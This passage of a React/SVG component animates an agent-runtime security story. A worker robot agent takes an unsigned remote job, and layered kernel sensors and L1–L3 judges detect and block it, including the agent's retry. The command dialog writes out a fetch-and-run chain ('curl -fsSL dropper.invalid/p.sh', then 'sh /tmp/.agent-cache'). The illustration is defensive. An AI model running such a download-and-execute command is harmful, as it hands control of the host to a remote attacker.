import { useCallback, useEffect, useRef, useState } from 'react';
import { withBase } from '@rspress/core/runtime';
import { Icon } from './icons';
import {
  CHAPTER_INDEX,
  CHAPTERS,
  TOTAL_DURATION,
  formatDuration,
  getChapterAt,
  type ChapterKey,
} from './agent-runtime-story';

function useReducedMotion() {
  const [reduced, setReduced] = useState(false);

  useEffect(() => {
    const media = window.matchMedia('(prefers-reduced-motion: reduce)');
    const handleChange = () => setReduced(media.matches);
    handleChange();
    media.addEventListener('change', handleChange);
    return () => media.removeEventListener('change', handleChange);
  }, []);

  return reduced;
}

function useDocumentVisible() {
  const [visible, setVisible] = useState(true);

  useEffect(() => {
    const handleVisibility = () => setVisible(!document.hidden);
    handleVisibility();
    document.addEventListener('visibilitychange', handleVisibility);
    return () =>
      document.removeEventListener('visibilitychange', handleVisibility);
  }, []);

  return visible;
}

function usePlayback(isInView: boolean) {
  const [started, setStarted] = useState(false);
  const [finished, setFinished] = useState(false);
  const [elapsed, setElapsed] = useState(0);
  const [runId, setRunId] = useState(0);
  const elapsedRef = useRef(0);
  const runIdRef = useRef(0);
  const hasPlayedRef = useRef(false);
  const documentVisible = useDocumentVisible();

  useEffect(() => {
    if (!started || finished || !documentVisible || !isInView) return;

    const active = getChapterAt(elapsedRef.current);
    const remaining = Math.max(
      0,
      active.chapter.duration - active.chapterElapsed,
    );
    const segmentStart = elapsedRef.current;
    const startedAt = performance.now();
    const generation = runIdRef.current;
    let completed = false;

    const timer = window.setTimeout(() => {
      completed = true;
      const next = Math.min(TOTAL_DURATION, segmentStart + remaining);
      elapsedRef.current = next;
      setElapsed(next);
      if (next >= TOTAL_DURATION) setFinished(true);
    }, remaining);

    return () => {
      window.clearTimeout(timer);
      if (!completed && runIdRef.current === generation) {
        const consumed = Math.min(remaining, performance.now() - startedAt);
        elapsedRef.current = Math.min(TOTAL_DURATION, segmentStart + consumed);
      }
    };
  }, [documentVisible, elapsed, finished, isInView, runId, started]);

  const replay = useCallback(() => {
    if (hasPlayedRef.current) {
      runIdRef.current += 1;
      setRunId(runIdRef.current);
    } else {
      hasPlayedRef.current = true;
    }
    elapsedRef.current = 0;
    setElapsed(0);
    setFinished(false);
    setStarted(true);
  }, []);

  return {
    elapsed,
    finished,
    paused: started && !finished && (!documentVisible || !isInView),
    replay,
    runId,
    started,
  };
}

type StageState = 'story-is-future' | 'story-is-current' | 'story-is-past';

function getStageState(
  chapterIndex: number,
  from: ChapterKey,
  to: ChapterKey = from,
): StageState {
  const start = CHAPTER_INDEX[from];
  const end = CHAPTER_INDEX[to];
  if (chapterIndex < start) return 'story-is-future';
  if (chapterIndex > end) return 'story-is-past';
  return 'story-is-current';
}

function CleanerBot({ state }: { state: StageState }) {
  return (
    <g className={`cleaner-layer ${state}`}>
      <g className="cleaner-travel">
        <g className="cleaner-bot">
          <ellipse className="cleaner-shadow" cx="72" cy="74" rx="70" ry="12" />
          <path className="cleaner-track" d="M12 45h113l18 17-17 23H17L0 65z" />
          <path
            className="cleaner-track-inner"
            d="M20 55h98l10 10-10 10H20L9 65z"
          />
          <circle className="cleaner-wheel" cx="28" cy="65" r="11" />
          <circle className="cleaner-wheel" cx="58" cy="65" r="11" />
          <circle className="cleaner-wheel" cx="89" cy="65" r="11" />
          <circle className="cleaner-wheel" cx="117" cy="65" r="11" />

          <path className="cleaner-body" d="M30-16h80l20 18v44H15V2z" />
          <path className="cleaner-body-shadow" d="M15 28h115v18H15z" />
          <path className="cleaner-face" d="M43-4h55l10 9v18H36V3z" />
          <rect className="cleaner-eye" x="49" y="5" width="13" height="7" />
          <rect className="cleaner-eye" x="79" y="5" width="13" height="7" />
          <path className="cleaner-mouth" d="M58 18h20" />
          <path className="cleaner-lamp-stem" d="M92-16v-15h15" />
          <rect
            className="cleaner-lamp"
            x="104"
            y="-38"
            width="14"
            height="14"
          />

          <g className="cleaner-arm">
            <path className="cleaner-shoulder" d="M105-1h27v22h-27z" />
            <path className="cleaner-arm-back" d="m124 9 34-34 16 14-35 37z" />
            <circle className="cleaner-joint" cx="164" cy="-18" r="12" />
            <path className="cleaner-arm-front" d="m170-22 31-65 15 8-30 67z" />
            <circle className="cleaner-joint" cx="208" cy="-82" r="10" />
            <path className="roller-yoke" d="M207-84h27v-454h-27" />
            <path className="roller" d="M226-550h27v581h-27z" />
            <path className="roller-edge" d="M247-550h8v581h-8z" />
            <g className="wipe-flecks">
              <rect x="259" y="-510" width="8" height="8" />
              <rect x="268" y="-376" width="5" height="5" />
              <rect x="260" y="-218" width="10" height="7" />
              <rect x="269" y="-72" width="6" height="6" />
            </g>
          </g>
        </g>
      </g>
    </g>
  );
}

type WorkerMode =
  | 'desk'
  | 'intent'
  | 'turn'
  | 'walk'
  | 'phone'
  | 'background'
  | 'retry'
  | 'blocked';

function WorkerAgent({ mode }: { mode: WorkerMode }) {
  const handsetHeld =
    mode === 'phone' || mode === 'retry' || mode === 'blocked';

  return (
    <g className={`worker worker-${mode}`}>
      <g className="worker-travel">
        <ellipse className="actor-shadow" cx="0" cy="7" rx="63" ry="10" />
        <g className="worker-body">
          <g className="worker-track-base">
            <path
              className="worker-track"
              d="M-60-66h104l19 16-12 49H-55l-16-33z"
            />
            <path
              className="worker-track-inner"
              d="M-49-53h86l12 10-9 29h-88l-10-22z"
            />
            <circle className="worker-track-wheel" cx="-39" cy="-32" r="10" />
            <circle className="worker-track-wheel" cx="-13" cy="-32" r="10" />
            <circle className="worker-track-wheel" cx="13" cy="-32" r="10" />
            <circle className="worker-track-wheel" cx="38" cy="-32" r="10" />
            <path
              className="worker-track-armor"
              d="M-60-66h104l19 16-7 18-20-13h-82l-17 14-8-3z"
            />
            <path
              className="worker-treads"
              d="M-53-57h20m9 0h20m9 0h20m9 0h13M-50-8h20m9 0h20m9 0h20m9 0h11"
            />
          </g>
          <path className="worker-hip" d="M-43-82h85l11 19-94 4-12-15z" />
          <path
            className="worker-torso"
            d="M-49-157h72l33 25-12 66-87-3-17-54z"
          />
          <path
            className="worker-shoulder-blade"
            d="M-56-151h-20l-13 24 34 7zm85-2h21l22 27-31 9z"
          />
          <path
            className="worker-rear-panel"
            d="M-33-137h60l12 15-10 41h-64l-9-38z"
          />
          <path
            className="worker-rear-vents"
            d="m-25-126 45 6m-42 8 39 5m-35 9 31 4"
          />
          <path className="worker-core" d="m-6-87 22-5 5 12-24 5z" />
          <path className="worker-spine" d="M-40-145v58m7-46h-16m18 17h-15" />
          <path
            className="worker-back-cable"
            d="M29-113c30 7 28 29 7 31s-20 19 1 21"
          />
          <path className="worker-neck" d="M-24-164h35l9 19-42 5z" />

          <g className="worker-head">
            <path
              className="worker-skull"
              d="M-50-238h66l43 28-13 43-82 8-25-25z"
            />
            <path
              className="worker-rear-head"
              d="M-42-222h57l28 18-9 25-67 5-17-17z"
            />
            <path className="worker-head-seam" d="m-32-208 52 11m-39 10 38 5" />
            <path className="worker-side-visor" d="M17-213h40l-7 21-37-3z" />
            <path className="worker-side-eye" d="M24-205h27l-3 7-27-2z" />
            <path className="worker-jaw" d="m-33-174 52-5 13 17-58 8z" />
            <path className="worker-antenna" d="M-25-232-9-253h22" />
            <rect
              className="worker-antenna-light"
              x="10"
              y="-259"
              width="9"
              height="9"
            />
          </g>

          <g className="worker-arm worker-arm-back">
            <path d="M-48-136h-21l-18 20 13 15 33-21z" />
            <path className="worker-hand" d="M-89-140h34l-8 18h-31l9-7z" />
            <path className="worker-claws" d="M-88-122v9m11-10v11m11-13v10" />
          </g>
          <g className="worker-arm worker-arm-front">
            <path d="M37-137h22l20 17-13 16-36-18z" />
            <path className="worker-hand" d="M51-140h35l7 10-10 9H53z" />
            <path className="worker-claws" d="M61-121v9m11-10v11m11-13v10" />
          </g>

          <g className={`held-handset${handsetHeld ? ' is-held' : ''}`}>
            <path className="phone-hand-arm" d="M34-134h23l17 48-20 9-23-43z" />
            <path className="held-handset-body" d="M42-220h18v71H42z" />
            <path
              className="held-handset-cap"
              d="M32-228h37v20H32zM32-160h37v21H32z"
            />
            <path className="held-handset-shine" d="M56-210v49" />
          </g>
        </g>
      </g>
    </g>
  );
}

function SecurityAgent({ state }: { state: StageState }) {
  return (
    <g className={`security-agent-layer ${state}`}>
      <g className="security-travel">
        <ellipse className="actor-shadow" cx="0" cy="5" rx="42" ry="8" />
        <g className="security-body">
          <path
            className="security-leg security-leg-back"
            d="M-22-42h14V0h-23v-12h9z"
          />
          <path
            className="security-leg security-leg-front"
            d="M9-42h14V0H4v-12h5z"
          />
          <path className="security-coat" d="M-37-128h72l16 93h-101z" />
          <path
            className="security-coat-shadow"
            d="M0-124v86M-23-109 0-86l22-23"
          />
          <path className="security-neck" d="M-14-148h29v24h-29z" />
          <g className="security-head">
            <path
              className="security-skull"
              d="M-34-207h65l15 15v40l-16 17h-65l-16-17v-40z"
            />
            <path className="security-visor" d="M-31-190h60v27h-60z" />
            <path className="security-eye-line" d="M-21-178h40" />
            <rect
              className="security-focus"
              x="4"
              y="-184"
              width="13"
              height="12"
            />
            <path className="security-antenna" d="M24-207 39-224h13" />
          </g>
          <g className="security-arm security-arm-back">
            <path d="M-34-115h-17v56h17z" />
            <path className="security-glove" d="M-54-67h23v20h-23z" />
          </g>
          <g className="security-front-shoulder" transform="translate(39 -108)">
            <g className="security-upper-arm">
              <circle
                className="security-shoulder-joint"
                cx="0"
                cy="0"
                r="11"
              />
              <path
                className="security-upper-arm-plate"
                d="M-8 4h16l4 38-12 8-12-8z"
              />
              <g transform="translate(0 43)">
                <g className="security-forearm">
                  <circle
                    className="security-elbow-joint"
                    cx="0"
                    cy="0"
                    r="9"
                  />
                  <path
                    className="security-forearm-plate"
                    d="M-7 5h14l5 31-12 8-12-8z"
                  />
                  <g className="security-wrist" transform="translate(0 38)">
                    <path
                      className="security-glove"
                      d="M-13-4h25l7 11-8 12h-24l-7-12z"
                    />
                    <g transform="translate(8 -8)">
                      <g className="security-scanner">
                        <path
                          className="scanner-shell"
                          d="M0-10h44l10 9-7 27H4L-5 7z"
                        />
                        <rect
                          className="security-lens-screen"
                          x="8"
                          y="-2"
                          width="27"
                          height="15"
                        />
                        <path
                          className="scanner-reticle"
                          d="M38 1h8m-4-4v8M12 18h27"
                        />
                        <rect
                          className="scanner-aperture"
                          x="43"
                          y="7"
                          width="9"
                          height="10"
                        />
                      </g>
                    </g>
                  </g>
                </g>
              </g>
            </g>
          </g>
        </g>
      </g>
    </g>
  );
}

function Scene({
  chapterIndex,
  locale,
}: {
  chapterIndex: number;
  locale: 'en' | 'zh';
}) {
  const text = sceneText[locale];
  const finaleTagline =
    locale === 'zh'
      ? '一次风险判断 进入下一次执行前的控制'
      : 'ONE DECISION BECOMES CONTROL BEFORE THE NEXT EXECUTION';
  const scanState = getStageState(chapterIndex, 'scan');
  const revealState = getStageState(chapterIndex, 'reveal');
  const officeState = getStageState(chapterIndex, 'reveal', 'command');
  const intentState = getStageState(chapterIndex, 'intent');
  const commandState = getStageState(chapterIndex, 'command', 'transmit');
  const auditState = getStageState(chapterIndex, 'transmit', 'block');
  const transmitState = getStageState(chapterIndex, 'transmit');
  const kernelState = getStageState(chapterIndex, 'kernel');
  const l1State = getStageState(chapterIndex, 'l1', 'l1-escalate');
  const l1EscalateState = getStageState(chapterIndex, 'l1-escalate');
  const l2State = getStageState(chapterIndex, 'l2', 'l2-escalate');
  const l2EscalateState = getStageState(chapterIndex, 'l2-escalate');
  const l3State = getStageState(chapterIndex, 'l3-arrival', 'report');
  const evidenceState = getStageState(chapterIndex, 'l3-review', 'report');
  const reportState = getStageState(chapterIndex, 'report');
  const gateState = getStageState(chapterIndex, 'rule', 'block');
  const ruleState = getStageState(chapterIndex, 'rule');
  const retryState = getStageState(chapterIndex, 'retry', 'block');
  const finaleState = getStageState(chapterIndex, 'finale');

  let workerMode: WorkerMode = 'desk';
  if (chapterIndex === CHAPTER_INDEX.intent) workerMode = 'intent';
  if (chapterIndex === CHAPTER_INDEX.turn) workerMode = 'turn';
  if (chapterIndex === CHAPTER_INDEX.walk) workerMode = 'walk';
  if (
    chapterIndex >= CHAPTER_INDEX.command &&
    chapterIndex <= CHAPTER_INDEX.transmit
  )
    workerMode = 'phone';
  if (
    chapterIndex >= CHAPTER_INDEX.kernel &&
    chapterIndex <= CHAPTER_INDEX.rule
  )
    workerMode = 'background';
  if (chapterIndex === CHAPTER_INDEX.retry) workerMode = 'retry';
  if (chapterIndex >= CHAPTER_INDEX.block) workerMode = 'blocked';

  return (
    <svg
      className="runtime-world"
      viewBox="0 0 1440 810"
      role="presentation"
      shapeRendering="crispEdges"
      preserveAspectRatio="xMidYMid meet"
    >
      <defs>
        <pattern
          id="pixel-floor"
          width="48"
          height="24"
          patternUnits="userSpaceOnUse"
        >
          <path
            d="M0 24 24 0l24 24M24 24 0 0M48 24 24 0"
            fill="none"
            stroke="#24233a"
            strokeWidth="2"
          />
        </pattern>
        <pattern
          id="audit-grid"
          width="32"
          height="32"
          patternUnits="userSpaceOnUse"
        >
          <path d="M32 0H0v32" fill="none" stroke="#172331" strokeWidth="2" />
        </pattern>
        <filter id="soft-cyan" x="-50%" y="-50%" width="200%" height="200%">
          <feGaussianBlur stdDeviation="3.5" result="b" />
          <feMerge>
            <feMergeNode in="b" />
            <feMergeNode in="SourceGraphic" />
          </feMerge>
        </filter>
        <filter id="soft-red" x="-50%" y="-50%" width="200%" height="200%">
          <feGaussianBlur stdDeviation="4" result="b" />
          <feMerge>
            <feMergeNode in="b" />
            <feMergeNode in="SourceGraphic" />
          </feMerge>
        </filter>
        <filter id="soft-amber" x="-50%" y="-50%" width="200%" height="200%">
          <feGaussianBlur stdDeviation="3" result="b" />
          <feMerge>
            <feMergeNode in="b" />
            <feMergeNode in="SourceGraphic" />
          </feMerge>
        </filter>
        <filter id="soft-green" x="-50%" y="-50%" width="200%" height="200%">
          <feGaussianBlur stdDeviation="3.5" result="b" />
          <feMerge>
            <feMergeNode in="b" />
            <feMergeNode in="SourceGraphic" />
          </feMerge>
        </filter>
      </defs>

      <rect width="1440" height="810" fill="#010204" />

      <g className={`scan-layer ${scanState}`}>
        <rect className="scan-black" width="1440" height="810" />
        <g className="scan-console">
          <path
            className="scan-brackets"
            d="M478 318v-31h42m442 0h42v31M478 468v31h42m442 0h42v-31"
          />
          <text className="scan-title" x="720" y="382">
            {text.scan}
          </text>
          <text className="scan-subtitle" x="720" y="422">
            READ ONLY // LOCAL HOST
          </text>
          <path className="scan-progress" d="M544 449h352" />
          <path className="scan-progress-hot" d="M544 449h352" />
          <path className="scan-sweep" d="M492 304h456" />
        </g>
      </g>

      <g className={`office-layer ${officeState}`}>
        <path className="office-shell" d="M42 92h690v593H42z" />
        <path className="office-back-wall" d="M58 108h658v489H58z" />
        <path
          className="office-floor"
          d="M58 597h658v72H58z"
          fill="url(#pixel-floor)"
        />
        <path className="office-floor-edge" d="M58 590h658v16H58z" />

        <g className="wall-work-console">
          <path className="work-console-case" d="M78 129h218v222H78z" />
          <path className="work-console-screen" d="M91 144h192v151H91z" />
          <path className="work-console-rail" d="M91 308h192v28H91z" />
          <g className="wall-work-content">
            <text className="screen-kicker" x="104" y="166">
              LOCAL TASK QUEUE
            </text>
            <g className="safe-task safe-task-one">
              <rect x="104" y="180" width="10" height="10" />
              <path d="m106 185 3 3 6-8" />
              <text x="124" y="190">
                git status
              </text>
            </g>
            <g className="safe-task safe-task-two">
              <rect x="104" y="207" width="10" height="10" />
              <path d="m106 212 3 3 6-8" />
              <text x="124" y="217">
                npm test
              </text>
            </g>
            <g className="safe-task safe-task-three">
              <rect x="104" y="234" width="10" height="10" />
              <path d="m106 239 3 3 6-8" />
              <text x="124" y="244">
                read config
              </text>
            </g>
            <g className="suspicious-task">
              <path
                className="suspicious-task-frame"
                d="M102 251h168v35H102z"
              />
              <path
                className="suspicious-task-mark"
                d="m110 277 9-18 9 18zm9-12v6m0 3v2"
              />
              <text className="suspicious-task-title" x="136" y="266">
                REMOTE JOB
              </text>
              <text className="suspicious-task-source" x="136" y="279">
                source: unsigned
              </text>
              <path
                className="suspicious-task-ingress"
                d="M279 268h-12m4-5-5 5 5 5"
              />
            </g>
          </g>
          <g className="console-processors">
            <rect x="103" y="316" width="68" height="11" />
            <rect x="180" y="316" width="55" height="11" />
            <circle cx="266" cy="322" r="6" />
          </g>
          <path className="console-drop-cable" d="M187 351v78h91v69" />
        </g>

        <g className="ceiling-lamp">
          <path className="lamp-cable" d="M450 108v50" />
          <path className="lamp-shade" d="M395 158h110l24 50H371z" />
          <path className="lamp-light" d="M388 208h124l96 241H292z" />
          <rect className="lamp-bulb" x="426" y="194" width="47" height="13" />
        </g>

        <g className="host-rack">
          <path className="host-rack-case" d="M85 385h142v141H85z" />
          <g className="host-slot host-slot-one">
            <rect x="98" y="400" width="116" height="27" />
            <circle cx="111" cy="414" r="4" />
            <path d="M123 414h74" />
          </g>
          <g className="host-slot host-slot-two">
            <rect x="98" y="439" width="116" height="27" />
            <circle cx="111" cy="453" r="4" />
            <path d="M123 453h74" />
          </g>
          <g className="host-slot host-slot-three">
            <rect x="98" y="478" width="116" height="27" />
            <circle cx="111" cy="492" r="4" />
            <path d="M123 492h74" />
          </g>
          <path className="rack-data-cable" d="M156 526v82h122v58" />
        </g>

        <g className="desk-set">
          <path className="desk-top" d="M250 498h305v21H250z" />
          <path className="desk-front" d="M268 519h269v26H268z" />
          <path
            className="desk-leg"
            d="M278 545h18v88h-18zM510 545h18v88h-18z"
          />
          <g className="main-monitor">
            <path className="monitor-shell" d="M306 337h170v128H306z" />
            <path className="monitor-screen" d="M319 350h144v101H319z" />
            <g className="monitor-work-lines">
              <text className="terminal-command" x="331" y="369">
                $ inspect workspace
              </text>
              <text className="terminal-ok" x="331" y="389">
                12 files · clean
              </text>
              <text className="terminal-command terminal-note" x="331" y="409">
                $ update notes
              </text>
              <text className="terminal-ok terminal-note" x="331" y="429">
                saved report.md
              </text>
              <g className="monitor-remote-job">
                <text x="331" y="409">
                  $ claim job #7F
                </text>
                <text x="331" y="429">
                  remote · unsigned
                </text>
              </g>
            </g>
            <rect
              className="monitor-cursor"
              x="331"
              y="437"
              width="10"
              height="6"
            />
            <path className="monitor-neck" d="M380 465h22v24h-22z" />
            <path className="monitor-foot" d="M350 489h82v9h-82z" />
          </g>
          <g className="side-monitor">
            <path className="monitor-shell" d="M482 386h66v76h-66z" />
            <path className="side-monitor-screen" d="M491 395h48v58h-48z" />
            <g className="side-source-map">
              <rect
                className="side-source-remote"
                x="498"
                y="403"
                width="12"
                height="12"
              />
              <rect
                className="side-source-local"
                x="522"
                y="434"
                width="11"
                height="11"
              />
              <path
                className="side-source-route"
                d="M507 415 527 434m-8-2 8 2-2-8"
              />
            </g>
          </g>
          <path className="keyboard" d="M332 479h133l17 19H315z" />
          <path className="keyboard-rows" d="M334 486h117m-104 6h112" />
        </g>

        <g className="chair">
          <path className="chair-back" d="M337 459h65v92h-65z" />
          <path className="chair-seat" d="M326 545h83v19h-83z" />
          <path className="chair-post" d="M360 564h17v55h-17z" />
          <path className="chair-feet" d="M330 626h78M369 616v10" />
          <circle cx="332" cy="630" r="6" />
          <circle cx="406" cy="630" r="6" />
        </g>

        <g className="phone-table">
          <path className="phone-table-top" d="M604 499h92v20h-92z" />
          <path
            className="phone-table-leg"
            d="M614 519h14v119h-14zM672 519h14v119h-14z"
          />
          <path className="phone-table-brace" d="M621 598h58" />
        </g>

        <g className="red-phone">
          <ellipse
            className="phone-light-pool"
            cx="650"
            cy="502"
            rx="67"
            ry="36"
          />
          <path className="phone-base-shadow" d="M612 478h78l12 24h-102z" />
          <path className="phone-base" d="M617 449h66l13 40h-93z" />
          <path className="phone-cradle" d="M615 447h70v12h-70z" />
          <circle className="phone-dial-outer" cx="650" cy="473" r="18" />
          <circle className="phone-dial-inner" cx="650" cy="473" r="7" />
          <g className="phone-dial-holes">
            <circle cx="650" cy="461" r="2" />
            <circle cx="660" cy="467" r="2" />
            <circle cx="660" cy="478" r="2" />
            <circle cx="650" cy="484" r="2" />
            <circle cx="640" cy="478" r="2" />
            <circle cx="640" cy="467" r="2" />
          </g>
          <g className="phone-handset-resting">
            <path className="handset-body" d="M615 429h70v18h-70z" />
            <path
              className="handset-cap"
              d="M607 423h24v27h-24zM669 423h24v27h-24z"
            />
            <path className="handset-shine" d="M632 434h35" />
          </g>
          <path
            className="phone-coil"
            d="M687 448c31 6 25 25 7 24s-20 18 0 18 21 18 1 18c-21 0-21 20 2 21"
          />
          <path className="phone-runtime-wire" d="M696 529v103h75" />
        </g>

        <g className="device-cables">
          <path className="device-cable" d="M391 466v176h380" />
          <path className="device-cable" d="M515 462v150h256" />
          <path className="device-cable" d="M187 351v315h584" />
          <path
            className="device-pulse device-pulse-one"
            d="M391 466v176h380"
          />
          <path
            className="device-pulse device-pulse-two"
            d="M515 462v150h256"
          />
          <path
            className="device-pulse device-pulse-three"
            d="M187 351v315h584"
          />
        </g>

        <WorkerAgent mode={workerMode} />
      </g>

      <g className={`intent-layer ${intentState}`}>
        <path
          className="thought-bubble"
          d="M411 235h239l17 17v84l-17 17H411l-17-17v-84z"
        />
        <path
          className="thought-bubble-inner"
          d="M423 248h217l12 12v68l-12 12H423l-14-12v-68z"
        />
        <path className="thought-link" d="M412 350h-18v18h-18v18h-14" />
        <text className="thought-text" x="531" y="281">
          {text.implant}
        </text>
        <g className="thought-diagram">
          <g className="thought-node thought-fetch">
            <path d="M430 299h55v25h-55z" />
            <text x="457" y="316">
              FETCH
            </text>
          </g>
          <g className="thought-node thought-write">
            <path d="M505 299h55v25h-55z" />
            <text x="532" y="316">
              WRITE
            </text>
          </g>
          <g className="thought-node thought-shell">
            <path d="M580 299h55v25h-55z" />
            <text x="607" y="316">
              SHELL
            </text>
          </g>
          <path className="thought-arrow" d="M478 312h24m52 0h25" />
          <path
            className="thought-arrow-head"
            d="m496 307 7 5-7 5m77-10 7 5-7 5"
          />
        </g>
      </g>

      <g className={`command-projection ${commandState}`}>
        <path
          className="command-dialog"
          d="M329 207h378l18 18v167l-18 18h-79l-23 32-5-32H329l-18-18V225z"
        />
        <path
          className="command-dialog-inner"
          d="M343 221h350l16 15v143l-16 15H343l-16-15V236z"
        />
        <g className="command-copy">
          <text className="command-line command-line-one" x="354" y="263">
            {text.execute}
          </text>
          <text className="command-line command-line-two" x="354" y="300">
            FETCH curl -fsSL dropper.invalid/p.sh
          </text>
          <text className="command-line command-line-three" x="354" y="337">
            WRITE /tmp/.agent-cache
          </text>
          <text className="command-line command-line-four" x="354" y="374">
            SHELL sh /tmp/.agent-cache
          </text>
          <rect
            className="command-cursor command-cursor-one"
            x="354"
            y="250"
            width="5"
            height="16"
          />
          <rect
            className="command-cursor command-cursor-two"
            x="354"
            y="287"
            width="5"
            height="16"
          />
          <rect
            className="command-cursor command-cursor-three"
            x="354"
            y="324"
            width="5"
            height="16"
          />
          <rect
            className="command-cursor command-cursor-four"
            x="354"
            y="361"
            width="5"
            height="16"
          />
        </g>
      </g>

      <g className={`audit-architecture ${auditState}`}>
        <path className="audit-shell" d="M771 92h627v593H771z" />
        <path
          className="audit-back"
          d="M786 107h597v519H786z"
          fill="url(#audit-grid)"
        />
        <path className="audit-floor" d="M786 626h597v44H786z" />
        <path
          className="audit-divider"
          d="M956 107v519M1115 107v519M786 350h329M786 524h329M1115 545h268"
        />
        <path
          className="audit-beam"
          d="M771 80h627v27H771zM771 670h627v15H771z"
        />
        <g className="audit-pipes">
          <path d="M817 107v44h-31m289-44v35h40m268 17h-24v54" />
          <circle cx="817" cy="151" r="7" />
          <circle cx="1075" cy="142" r="7" />
          <circle cx="1359" cy="213" r="7" />
        </g>
        <g className="audit-lamps">
          <rect x="826" y="121" width="75" height="9" />
          <rect x="995" y="121" width="82" height="9" />
          <rect x="1198" y="121" width="103" height="9" />
        </g>
        <g className="boundary-door">
          <path className="door-frame" d="M738 251h48v357h-48z" />
          <path className="door-slot" d="M748 275h28v76h-28z" />
          <path
            className="door-teeth"
            d="M738 281h-13m13 29h-13m13 29h-13m61-58h13m-13 29h13m-13 29h13"
          />
        </g>
      </g>

      <g className={`transmit-layer ${transmitState}`}>
        <path className="risk-wire" d="M696 632h66v-213h81" />
        <path className="risk-wire-hot" d="M696 632h66v-213h81" />
        <g className="risk-packet">
          <path d="M0-13 18 0 0 13-18 0z" />
        </g>
      </g>

      <g className={`kernel-layer ${kernelState}`}>
        <g className="kernel-machine">
          <path className="kernel-case" d="M804 174h133v323H804z" />
          <path className="kernel-case-shadow" d="M817 187h107v297H817z" />
          <path className="kernel-crown" d="M825 153h91v21h-91z" />
          <g className="kernel-core">
            <circle className="kernel-core-ring" cx="870" cy="254" r="43" />
            <path
              className="kernel-core-blades"
              d="M870 213v28l20-20m21 33h-28l20 20m-33 21v-28l-20 20m-21-33h28l-20-20"
            />
            <rect
              className="kernel-core-eye"
              x="860"
              y="244"
              width="21"
              height="21"
            />
          </g>
          <g className="kernel-sensors">
            <g className="kernel-sensor sensor-one">
              <rect x="827" y="320" width="86" height="23" />
              <circle cx="840" cy="332" r="4" />
              <text x="851" y="336">
                EXEC
              </text>
            </g>
            <g className="kernel-sensor sensor-two">
              <rect x="827" y="351" width="86" height="23" />
              <circle cx="840" cy="363" r="4" />
              <text x="851" y="367">
                EGRESS
              </text>
            </g>
            <g className="kernel-sensor sensor-three">
              <rect x="827" y="382" width="86" height="23" />
              <circle cx="840" cy="394" r="4" />
              <text x="851" y="398">
                WRITE
              </text>
            </g>
            <g className="kernel-sensor sensor-four">
              <rect x="827" y="413" width="86" height="23" />
              <circle cx="840" cy="425" r="4" />
              <text x="851" y="429">
                SHELL
              </text>
            </g>
          </g>
          <path className="kernel-output" d="M870 497v27h179" />
          <g className="evidence-capsule">
            <path d="M833 451h69l13 17-13 17h-69l-13-17z" />
            <circle cx="841" cy="468" r="4" />
            <circle cx="855" cy="468" r="4" />
            <circle cx="869" cy="468" r="4" />
            <circle cx="883" cy="468" r="4" />
            <path d="M892 468h10" />
          </g>
        </g>
      </g>

      <g className={`l1-layer ${l1State}`}>
        <g className="judge-one">
          <path className="judge-case" d="M963 154h145v184H963z" />
          <path className="judge-window" d="M975 169h121v116H975z" />
          <text className="judge-stage" x="987" y="194">
            L1 FAST FILTER
          </text>
          <g className="l1-checks">
            <text x="987" y="221">
              FETCH
            </text>
            <text className="check-hit hit-one" x="1080" y="221">
              HIT
            </text>
            <text x="987" y="248">
              PIPE
            </text>
            <text className="check-hit hit-two" x="1080" y="248">
              HIT
            </text>
            <text x="987" y="275">
              RULE
            </text>
            <text className="check-none" x="1080" y="275">
              MISS
            </text>
          </g>
          <path className="l1-scanline" d="M979 204h113" />
          <g className="l1-slip">
            <path d="M975 296h121v29H975z" />
            <text x="1035" y="316">
              ESCALATE L2
            </text>
          </g>
        </g>
        <path className="judge-link-one" d="M937 310h26" />
        <g className="l1-input-packet">
          <path d="m0-9 14 9-14 9-14-9z" />
        </g>
      </g>

      <g className={`l1-escalation-layer ${l1EscalateState}`}>
        <path className="escalation-rail l1-rail" d="M1035 338v17" />
        <g className="l1-report-packet">
          <path d="M-22-12h44v24h-44z" />
          <path d="M-13-5h26M-13 2h19" />
        </g>
      </g>

      <g className={`l2-layer ${l2State}`}>
        <g className="judge-two">
          <path className="judge-case" d="M963 355h145v164H963z" />
          <path className="judge-window" d="M975 370h121v106H975z" />
          <text className="judge-stage" x="987" y="394">
            L2 CORRELATE
          </text>
          <g className="l2-chain">
            <path
              className="chain-boxes"
              d="M980 405h33v27h-33zm42 0h41v27h-41zm50 0h19v27h-19z"
            />
            <text x="996" y="423">
              NET
            </text>
            <text x="1042" y="423">
              WRITE
            </text>
            <text x="1081" y="423">
              SH
            </text>
            <path className="chain-links" d="M1013 418h9m41 0h9" />
            <text className="chain-found" x="1035" y="451">
              CHAIN FOUND
            </text>
            <text className="context-required" x="1035" y="470">
              CTX REQUIRED
            </text>
          </g>
          <g className="l2-slip">
            <path d="M975 483h121v27H975z" />
            <text x="1035" y="502">
              ESCALATE L3
            </text>
          </g>
        </g>
        <path className="judge-link-two" d="M1108 436h27" />
      </g>

      <g className={`l2-escalation-layer ${l2EscalateState}`}>
        <path className="escalation-rail l2-rail" d="M1108 436h27" />
        <g className="l2-report-packet">
          <path d="M-24-14h48v28h-48z" />
          <path d="M-15-7h30M-15 0h24M-15 7h18" />
        </g>
      </g>

      <g className={`l3-layer ${l3State}`}>
        <g className="investigation-room">
          <path className="investigation-window" d="M1134 150h230v368h-230z" />
          <path className="investigation-floor" d="M1129 518h244v27h-244z" />
          <g className="evidence-rack">
            <path className="rack-rail" d="M1146 174h206v130H1146z" />
            <g className="evidence-reel reel-context">
              <circle cx="1177" cy="235" r="22" />
              <circle cx="1177" cy="235" r="7" />
              <path d="M1177 216v13m0 12v13m-19-19h13m12 0h13" />
            </g>
            <g className="evidence-reel reel-trajectory">
              <circle cx="1249" cy="235" r="22" />
              <circle cx="1249" cy="235" r="7" />
              <path d="M1249 216v13m0 12v13m-19-19h13m12 0h13" />
            </g>
            <g className="evidence-reel reel-host">
              <circle cx="1321" cy="235" r="22" />
              <circle cx="1321" cy="235" r="7" />
              <path d="M1321 216v13m0 12v13m-19-19h13m12 0h13" />
            </g>
            <g className="evidence-labels">
              <text x="1177" y="197">
                INTENT
              </text>
              <text x="1249" y="197">
                TRACE
              </text>
              <text x="1321" y="197">
                HOST
              </text>
            </g>
            <path
              className="evidence-thread"
              d="M1177 257v51h72v-51m0 51h72v-51m-144 51h144"
            />
            <rect
              className="evidence-node node-one"
              x="1169"
              y="300"
              width="16"
              height="16"
            />
            <rect
              className="evidence-node node-two"
              x="1241"
              y="300"
              width="16"
              height="16"
            />
            <rect
              className="evidence-node node-three"
              x="1313"
              y="300"
              width="16"
              height="16"
            />
